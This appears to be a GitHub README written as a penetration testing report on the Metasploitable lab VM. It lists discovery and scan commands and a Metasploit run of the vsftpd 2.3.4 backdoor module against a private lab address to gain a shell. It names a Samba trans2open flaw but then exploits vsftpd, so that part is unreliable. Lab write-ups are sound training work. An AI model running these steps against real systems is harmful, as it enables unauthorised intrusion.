# Metasploitable
 Metasaploitable VM - A detailed penetration testing report covering enumeration, vulnerability analysis, and exploitation.

## 📋 Table of Contents
1. [Enumeration](#1-enumeration)
2. [Vulnerability Analysis](#2-vulnerability-analysis)
3. [Exploitation](#3-exploitation)

---

## 1. Enumeration
In this phase, I identified the target and scanned for open services.

### Network Discovery
I used `ip addr show` to indetify my IP Then `netdiscover` to find the target IP on the local NAT network.
*   **Command:** `ip addr show ` 192.168.2.4
*   **Command:** `sudo netdiscover -r 192.168.2.4/24`
*   **Evidence:** [View Ip address](https://github.com/user-attachments/assets/5f447afc-fa0a-4e11-bf17-49d9030fe24c)
*   **Evidence:** [View Devices](https://github.com/user-attachments/assets/90c40bcc-63eb-4c22-9a69-5a8b9bb54d51)

### Port Scanning
An aggressive Nmap scan revealed several interesting ports, including 80 (HTTP) and 139/445 (SMB).
*   **Command:** `enum4linux 192.168.2.13`
*   **Command:** `nmap -A -p- 192.168.2.13`
*   **Evidence:** [View Enumeration](https://github.com/user-attachments/assets/25f4874a-ae69-41ac-af15-963f2eb71219)
*   **Evidence:** [View Nmap Scan](https://github.com/user-attachments/assets/0010925a-033e-4e61-8bc2-760cd8bc2fa4)

---

## 2. Vulnerability Analysis
I identified an outdated version of **Samba (2.2.1)** which is vulnerable to a "trans2open" overflow.
*   **Command:** Searchsploit Vsftpd 2.3.4
*   **Command:** Load msfconsole & serach Vsftpd 2.3 
*   **Evidence:** [View Searchsploit](https://github.com/user-attachments/assets/bdeeb27f-17ad-4670-8196-d935e61e2f84)
*   **Evidence:** [View msfconsole search](https://github.com/user-attachments/assets/ed58c17e-0022-472b-b19e-f7f678fc5e3c)


---

## 3. Exploitation
I then set the Responding Host, Listening Host loaded the payload then proceeded to Run(exploit)
*   **Command:** `use 0 (select backdoor exploit) `
*   **Command:** `set RHOSTS 192.168.2.13`
*   **Command:** `exploit`
*   **Command:** `ip addr show`
*   **Evidence:** [View  RHOSTS](ttps://github.com/user-attachments/assets/947c721b-989d-4e65-8408-1f129e6a7ed7)
*   **Evidence:** [View Payloads](https://github.com/user-attachments/assets/4f641558-b0a7-4a82-b471-d068c6082cba)
*   **Evidence:** [View Exploit](https://github.com/user-attachments/assets/456947ef-285a-4bc9-aad5-af2fd3ff82e9)
*   **Evidence:** [Gained Shell](https://github.com/user-attachments/assets/d1805912-3097-4605-80c7-5d089deab579)
